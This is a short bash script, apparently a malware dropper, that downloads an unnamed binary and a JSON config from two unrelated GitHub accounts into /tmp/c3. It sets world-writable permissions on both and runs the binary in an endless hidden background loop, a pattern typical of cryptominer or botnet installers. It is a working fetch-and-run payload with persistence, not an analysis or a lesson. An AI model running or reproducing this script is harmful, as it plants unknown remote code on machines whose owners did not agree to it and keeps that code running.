#!/bin/bash
mkdir -p /tmp/c3
cd /tmp/c3
wget https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/9v.json
wget https://raw.githubusercontent.com/Blenkinship/any/main/0
chmod -R  777 /tmp/c3
/bin/sh -c 'while true; do nohup /tmp/c3/0 --config=/tmp/c3/9v.json >/dev/null; done' &


##
